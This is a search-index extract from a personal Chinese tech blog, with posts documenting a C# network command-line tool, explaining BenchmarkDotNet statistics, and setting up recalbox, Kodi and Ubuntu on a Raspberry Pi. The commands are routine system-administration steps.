","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:5","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#操作-redis"},{"categories":["blog"],"content":" k8s 状态查询k8s 命令的存在，主要是因为我日常需要查看 k8s 集群的信息，所以做到了命令里。 Description: get k8s resource info Usage: ken k8s [command] [options] Options: -c, --kubeconfig \u003ckubeconfig\u003e kubeconfig file path -n, --namespace \u003cnamespace\u003e specified namespace -?, -h, --help Show help and usage information Commands: 1 list restarted pod 2 list deployment resource usage 查看 k8s 内重启过的容器 ken k8s 1 ┌───────────┬──────────────────┬───────────────┐ │ Namespace │ Pod Name │ Restart Times │ ├───────────┼──────────────────┼───────────────┤ │ default │ A-service │ 187 │ │ default │ B-service │ 1 │ │ default │ C-service │ 3 │ └───────────┴──────────────────┴───────────────┘ 查看 deployment 的资源使用情况ken k8s 2 大致输出如下 Namespace Deployment Memory Usage Cpu Usage Request Memory Limit Memory Request Cpu Limit Cpu default kube-state-metrics 3.57% 0.25% 32Mi 1Gi 10m 200m ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:6","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#k8s-状态查询"},{"categories":["blog"],"content":" k8s 状态查询k8s 命令的存在，主要是因为我日常需要查看 k8s 集群的信息，所以做到了命令里。 Description: get k8s resource info Usage: ken k8s [command] [options] Options: -c, --kubeconfig kubeconfig file path -n, --namespace specified namespace -?, -h, --help Show help and usage information Commands: 1 list restarted pod 2 list deployment resource usage 查看 k8s 内重启过的容器 ken k8s 1 ┌───────────┬──────────────────┬───────────────┐ │ Namespace │ Pod Name │ Restart Times │ ├───────────┼──────────────────┼───────────────┤ │ default │ A-service │ 187 │ │ default │ B-service │ 1 │ │ default │ C-service │ 3 │ └───────────┴──────────────────┴───────────────┘ 查看 deployment 的资源使用情况ken k8s 2 大致输出如下 Namespace Deployment Memory Usage Cpu Usage Request Memory Limit Memory Request Cpu Limit Cpu default kube-state-metrics 3.57% 0.25% 32Mi 1Gi 10m 200m ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:6","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#查看-k8s-内重启过的容器"},{"categories":["blog"],"content":" k8s 状态查询k8s 命令的存在，主要是因为我日常需要查看 k8s 集群的信息，所以做到了命令里。 Description: get k8s resource info Usage: ken k8s [command] [options] Options: -c, --kubeconfig kubeconfig file path -n, --namespace specified namespace -?, -h, --help Show help and usage information Commands: 1 list restarted pod 2 list deployment resource usage 查看 k8s 内重启过的容器 ken k8s 1 ┌───────────┬──────────────────┬───────────────┐ │ Namespace │ Pod Name │ Restart Times │ ├───────────┼──────────────────┼───────────────┤ │ default │ A-service │ 187 │ │ default │ B-service │ 1 │ │ default │ C-service │ 3 │ └───────────┴──────────────────┴───────────────┘ 查看 deployment 的资源使用情况ken k8s 2 大致输出如下 Namespace Deployment Memory Usage Cpu Usage Request Memory Limit Memory Request Cpu Limit Cpu default kube-state-metrics 3.57% 0.25% 32Mi 1Gi 10m 200m ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:6","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#查看-deployment-的资源使用情况"},{"categories":["blog"],"content":" 静态文件代理 webweb 直接将当前目录暴露成 http，并提供访问。方便调试、静态文件下载等等需求 Description: static file http server Usage: ken web [options] Options: -w, --webroot \u003cwebroot\u003e file path [default: .] -p, --port \u003cport\u003e http port [default: 5000] -?, -h, --help Show help and usage information # 使用示例 ken web listening http://0.0.0.0:5000 HTTP/1.1 GET / 200 text/html; charset=utf-8 5367 HTTP/1.1 GET /favicon.ico 404 默认当前目录，也可以只用 -w 指定目录 默认使用 5000 端口，也可以使用 -p 指定端口 ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:7","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#静态文件代理-web"},{"categories":["blog"],"content":" 更新 update这个命令主要是为了更新 ken 程序自己。避免冗长的 bash 命令。 ken update -h Description: update ken command Usage: ken update [options] Options: -f, --force force update current version [default: False] -kv, --ken-version \u003cken-version\u003e force upgrade to specific current version -p, --proxy use proxy url -t, --token \u003ctoken\u003e github token for query github-api [] -?, -h, --help Show help and usage information -p 使用 https://github.abskoop.workers.dev 代理下载，方便国内用户 -t 是因为 github 的 api 存在次数限制。带上 token 可以大幅提升 api 的请求次数 -kv 可以指定特定的版本，例如 -kv 1.3.2 则更新到 1.3.2 版本。因为我不想留着一些无用的版本号，所以 1.3.1 可能不见了。。。建议不使用此命令，直接 update 到最新版本 ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:8","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#更新-update"},{"categories":["blog"],"content":" 网站连通性测试 wpwp 是 web ping 的缩写. 顾名思义类似 sp 命令不断发送 http 请求, 帮助判断是否存活. Description: web ping Usage: ken wp \u003curl\u003e [options] Arguments: \u003curl\u003e url: https://www.kentxxq.com Options: -i, --interval \u003cinterval\u003e web ping interval seconds [default: 1] -t, --timeout \u003ctimeout\u003e default:2 seconds [default: 2] -d, --disableKeepAlive default: true [default: False] -f, --curlFile \u003ccurlFile\u003e if curlFile is not null ,Argument url will be ignore. default: '' [] --debug enable verbose output [default: False] # 每秒一次请求 ken wp https://baidu.com 09:51:24,https://baidu.com/: Redirect 245ms 09:51:25,https://baidu.com/: Redirect 37ms 09:51:26,https://baidu.com/: Redirect 40ms # 支持导入curl.如果导入了curl文件,https://a.com 将不会生效 ken wp https://a.com -f D:\\tmp\\curl.txt ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:9","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#网站连通性测试-wp"},{"categories":["blog"],"content":" 压测 bmbm 是 benchmark 的缩写. 用来进行压测 http 压测的. Description: http benchmark Usage: ken bm \u003curl\u003e [options] Arguments: \u003curl\u003e url: https://test.kentxxq.com/Counter/Count Options: -d, --duration \u003cduration\u003e duration: benchmark duration [default: 10] -c, --concurrent \u003cconcurrent\u003e concurrent: concurrent request [default: 50] -f, --curlFile \u003ccurlFile\u003e if curlFile is not null ,Argument url will be ignore. default: '' [] # 默认50并发,10秒钟.请求了3328次 ken bm https://test.kentxxq.com/counter/count 完成次数3328 ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:10","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#压测-bm"},{"categories":["blog"],"content":" 简介程序性能总是一个永恒的话题。各个系统、编程语言、算法、io 逻辑，总是不停的对比。今天在 csharp 闲逛的时候，看到了官方做的一个性能评测库，但是指标我却看不懂。于是就看了一会儿相关知识，准备记录一下。 ","date":"2021-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/benchmark%E7%9A%84%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/:1:0","series":null,"tags":["blog","csharp"],"title":"benchmark的数学知识","uri":"/posts/%E7%AC%94%E8%AE%B0/benchmark%E7%9A%84%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/#简介"},{"categories":["blog"],"content":" 程序说明抄了一个官方的 demo。很简单，就是在对比 md5 和 sha256 两者的性能。 using System; using System.Security.Cryptography; using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Jobs; using BenchmarkDotNet.Running; namespace Cli { public class Md5VsSha256 { private const int N = 10000; private readonly byte[] data; private readonly SHA256 sha256 = SHA256.Create(); private readonly MD5 md5 = MD5.Create(); public Md5VsSha256() { data = new byte[N]; new Random(42).NextBytes(data); } [Benchmark] public byte[] Sha256() =\u003e sha256.ComputeHash(data); [Benchmark] public byte[] Md5() =\u003e md5.ComputeHash(data); } class Program { static void Main(string[] args) { var summary = BenchmarkRunner.Run\u003cMd5VsSha256\u003e(); } } } ","date":"2021-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/benchmark%E7%9A%84%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/:2:0","series":null,"tags":["blog","csharp"],"title":"benchmark的数学知识","uri":"/posts/%E7%AC%94%E8%AE%B0/benchmark%E7%9A%84%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/#程序说明"},{"categories":["blog"],"content":" 输出分析首先需要将代码 release。因为这样会对代码进行优化。让我们的性能观测更加准确。 接下来就是查看我们的输出结果。 BenchmarkDotNet=v0.13.1, OS=Windows 10.0.22000 Intel Core i5-10210U CPU 1.60GHz, 1 CPU, 8 logical and 4 physical cores .NET SDK=5.0.400 [Host] : .NET 5.0.9 (5.0.921.35908), X64 RyuJIT DefaultJob : .NET 5.0.9 (5.0.921.35908), X64 RyuJIT | Method | Mean | Error | StdDev | |------- |---------:|---------:|---------:| | Sha256 | 48.94 us | 0.947 us | 1.197 us | | Md5 | 19.58 us | 0.356 us | 0.315 us | Mean : Arithmetic mean of all measurements Error : Half of 99.9% confidence interval StdDev : Standard deviation of all measurements 1 us : 1 Microsecond (0.000001 sec) Mean代表平均值。举例我们有 100 次样本，这时候 Mean=所有样本时间/100。也就是说可以看做是平均时间。 Error代表标准误差。标准误越小，样本均值和总体均值差距越小，那么样本数据就越能代表总体数据。标准误是多次抽样统计，量化了多组测量值均值的变化程度。因此用于推论统计，越小对 Mean 的结果推论越准确。 StdDev代表标准偏差。标准差越小，样本值之前的差别越小。标准差是一次抽样，量化了一组测量值的变化程度，用于描述统计。而我们的测试中用到了所有的样本 (all measurements)，所以这里我们可以知道 Mean 和实际请求时间相差多少 us。 ","date":"2021-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/benchmark%E7%9A%84%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/:3:0","series":null,"tags":["blog","csharp"],"title":"benchmark的数学知识","uri":"/posts/%E7%AC%94%E8%AE%B0/benchmark%E7%9A%84%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/#输出分析"},{"categories":["blog"],"content":" 总结我们通过结果和概念，可以得到以下信息 Mean 是此次性能测试的平均值。得到信息是：md5 是比 sha256 要快的。 Error 表明如果我们做更多的测试。sha256 所花费的时间，预计是 Mean 加减 0.947us。而 md5 预计是 Mean 加减 0.356us。得到的信息是：准确性还是不错的。 StdDev 表明在此次测试中，sha256 偏差是加减 1.197us。md5 偏差是加减 0.315us。得到的信息是：此次测试中每次花费的时间差别不大。 ","date":"2021-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/benchmark%E7%9A%84%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/:4:0","series":null,"tags":["blog","csharp"],"title":"benchmark的数学知识","uri":"/posts/%E7%AC%94%E8%AE%B0/benchmark%E7%9A%84%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/#总结"},{"categories":["blog"],"content":"recalbox 是一个游戏模拟器的合集 +kodi 媒体中心！是的，都集成到了一起是我选用它的主要原因。下面的内容都是在 [[笔记/point/树莓派|树莓派]] 上操作的.","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介recalbox 是一个游戏模拟器的合集 +kodi 媒体中心！是的，都集成到了一起是我选用它的主要原因。下面的内容都是在 树莓派 上操作的. ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 配置内容","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#配置内容"},{"categories":["blog"],"content":" 基础设置 中文显示:主菜单=\u003e系统设置=\u003e语言=\u003e确认选中语言 ip 地址查看:主菜单=\u003e网络设置=\u003eip地址 ssh 连接: ssh root@ip地址,密码 recalboxroot。但是有一点需要注意，recalbox 可以看作是一个独立的 linux 发行版。这意味着你无法使用 yum 或者 apt，也无法安装 npm 和 deb 包！ ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#基础设置"},{"categories":["blog"],"content":" Web 配置系统管理界面: 用浏览器访问ip，默认就是访问 80 端口。 其中的控制器模拟界面，对于测试了解手柄非常有用。 ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:2:2","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#web-配置"},{"categories":["blog"],"content":" recalbox 游戏这里我就讲一下大致的步骤吧，下载游戏的网站我也随便 贴一个，试过了没问题 下载一个游戏 rom 包，例如 马里奥.nes。这个文件名最后会变成 recalbox 里面的游戏名！！ 在 web界面 上传这个文件，重启 es 服务! nes 是 nintendo entertainment system 的简写，找到这个模拟器，就可以看到游戏了 ! ! ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:2:3","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#recalbox-游戏"},{"categories":["blog"],"content":" 开机自启 vim /etc/init.d/S99ddns-go #/bin/bash /etc/init.d/kentxxq/ddns-go # 授予执行权限 chmod +x /etc/init.d/S99ddns-go ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:2:4","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#开机自启"},{"categories":["blog"],"content":" kodi 配置主菜单=\u003ekodi媒体中心,系统会重启。kodi 和 recalbox 的键盘映射不一定相同！ kodi 中文设置 设置齿轮=\u003einterface=\u003eSkin=\u003eFont=\u003eArial based 同界面下，Regional=\u003eLanguage=\u003e简体中文 kodi 启用插件启用插件: 插件=\u003e我的插件=\u003ePVR客户端=\u003ePVR IPTV Simple Client=\u003e启用 使用直播源 去 github 上面 下载 需要的电视直播源文件。 默认 recalbox 通过 SMB协议共享 出来了我们需要的文件夹，我们可以直接访问进去。在 share/kodi 下面新建 m3u8 文件夹，然后把下载好的直播源文件放进去。 在插件 iptv 界面进入设置，选择本地文件 m3u。 点击 kodi 开关，退出。然后重新进入 kodi 进入电视就可以看是选台看电视了！ ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:2:5","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#kodi-配置"},{"categories":["blog"],"content":" kodi 配置主菜单=\u003ekodi媒体中心,系统会重启。kodi 和 recalbox 的键盘映射不一定相同！ kodi 中文设置 设置齿轮=\u003einterface=\u003eSkin=\u003eFont=\u003eArial based 同界面下，Regional=\u003eLanguage=\u003e简体中文 kodi 启用插件启用插件: 插件=\u003e我的插件=\u003ePVR客户端=\u003ePVR IPTV Simple Client=\u003e启用 使用直播源 去 github 上面 下载 需要的电视直播源文件。 默认 recalbox 通过 SMB协议共享 出来了我们需要的文件夹，我们可以直接访问进去。在 share/kodi 下面新建 m3u8 文件夹，然后把下载好的直播源文件放进去。 在插件 iptv 界面进入设置，选择本地文件 m3u。 点击 kodi 开关，退出。然后重新进入 kodi 进入电视就可以看是选台看电视了！ ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:2:5","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#kodi-中文设置"},{"categories":["blog"],"content":" kodi 配置主菜单=\u003ekodi媒体中心,系统会重启。kodi 和 recalbox 的键盘映射不一定相同！ kodi 中文设置 设置齿轮=\u003einterface=\u003eSkin=\u003eFont=\u003eArial based 同界面下，Regional=\u003eLanguage=\u003e简体中文 kodi 启用插件启用插件: 插件=\u003e我的插件=\u003ePVR客户端=\u003ePVR IPTV Simple Client=\u003e启用 使用直播源 去 github 上面 下载 需要的电视直播源文件。 默认 recalbox 通过 SMB协议共享 出来了我们需要的文件夹，我们可以直接访问进去。在 share/kodi 下面新建 m3u8 文件夹，然后把下载好的直播源文件放进去。 在插件 iptv 界面进入设置，选择本地文件 m3u。 点击 kodi 开关，退出。然后重新进入 kodi 进入电视就可以看是选台看电视了！ ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:2:5","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#kodi-启用插件"},{"categories":["blog"],"content":" kodi 配置主菜单=\u003ekodi媒体中心,系统会重启。kodi 和 recalbox 的键盘映射不一定相同！ kodi 中文设置 设置齿轮=\u003einterface=\u003eSkin=\u003eFont=\u003eArial based 同界面下，Regional=\u003eLanguage=\u003e简体中文 kodi 启用插件启用插件: 插件=\u003e我的插件=\u003ePVR客户端=\u003ePVR IPTV Simple Client=\u003e启用 使用直播源 去 github 上面 下载 需要的电视直播源文件。 默认 recalbox 通过 SMB协议共享 出来了我们需要的文件夹，我们可以直接访问进去。在 share/kodi 下面新建 m3u8 文件夹，然后把下载好的直播源文件放进去。 在插件 iptv 界面进入设置，选择本地文件 m3u。 点击 kodi 开关，退出。然后重新进入 kodi 进入电视就可以看是选台看电视了！ ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:2:5","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#使用直播源"},{"categories":["blog"],"content":" 疑难杂症","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:3:0","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#疑难杂症"},{"categories":["blog"],"content":" 操作系统架构recalbox7.1.1 是 armv7l 架构。 arm64 是 64 位，默认的话就是 arm32。所以 recalbox7.1.1 是 32 位. armv7 应该是可以运行 armv6 程序的，同理 armv8。 arm 默认都是小端存储。armv7l 就是后面的 l 就是小端的意思。 ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:3:1","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#操作系统架构"},{"categories":["blog"],"content":" 无法 chmod 执行权限 # 重新挂载即可 mount -o remount rw / # 然后拷贝到/下面 cp x /x chmod +x x ./x ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:3:2","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#无法-chmod-执行权限"},{"categories":["blog"],"content":" 图像显示溢出 # 当前我的版本是recalbox8: 去除黑边不一定有效，但是对图像溢出是有用的。 # 我在调整了很多次黑边距离，没有效果。虽然黑边不大，不太影响。 # 重新挂载/boot分区 mount -o remount,rw /boot # 编辑配置文件 su root /boot/config.txt disable_overscan=0 overscan_left=24 overscan_right=24 overscan_top=24 overscan_bottom=24 overscan_scale=1 # 重启生效 reboot ","date":"2021-03-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/:3:3","series":null,"tags":["blog","树莓派"],"title":"树莓派recalbox配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BErecalbox%E9%85%8D%E7%BD%AE/#图像显示溢出"},{"categories":["blog"],"content":"家里一直有一个树莓派在跑网盘备份, ddns, 以及使用 wol. 记录一下初始化的过程.","date":"2021-03-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/","series":null,"tags":["blog","树莓派"],"title":"树莓派初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/"},{"categories":["blog"],"content":" 简介家里一直有一个 树莓派 在跑网盘备份, ddns, 以及使用 wol. 记录一下初始化的过程. ","date":"2021-03-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/:1:0","series":null,"tags":["blog","树莓派"],"title":"树莓派初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/#简介"},{"categories":["blog"],"content":" 操作手册","date":"2021-03-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/:2:0","series":null,"tags":["blog","树莓派"],"title":"树莓派初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/#操作手册"},{"categories":["blog"],"content":" 刷机直接去 官网下载 imager，然后安装后。就可以通过图形界面选择需要的系统了。但是因为网络太慢，所以我直接去 ubuntu官网下载 镜像文件，然后 use custom 写入 tf 卡。 ","date":"2021-03-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/:2:1","series":null,"tags":["blog","树莓派"],"title":"树莓派初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/#刷机"},{"categories":["blog"],"content":" ssh 通过路由器或者 ip 扫描工具拿到 ip，然后 ssh 上去会提示修改密码 默认密码是 ubuntu ","date":"2021-03-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/:2:2","series":null,"tags":["blog","树莓派"],"title":"树莓派初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/#ssh"},{"categories":["blog"],"content":" 替换国内源文件位置 /etc/apt/sources.list。 # 备份 sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak # 创建文件 sudo vi /etc/apt/sources.list deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ focal-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ focal-security main restricted universe multiverse 更新: sudo apt update -y 升级: sudo apt upgrade -y ","date":"2021-03-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/:2:3","series":null,"tags":["blog","树莓派"],"title":"树莓派初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/#替换国内源"},{"categories":["blog"],"content":" wifi 配置进行配置 vim /etc/netplan/50-cloud-init.yaml。 但是 wifi 每次获取到的 ip 可能是不一样的，所以我们应该在路由里面把 ip 和 mac 地址进行绑定，保证 ip 地址不被会其他机器占用！！ network: ethernets: eth0: dhcp4: true optional: true version: 2 wifis: wlan0: optional: true access-points: \"TP-LINK_1D88\": password: \"123456781\" dhcp4: true 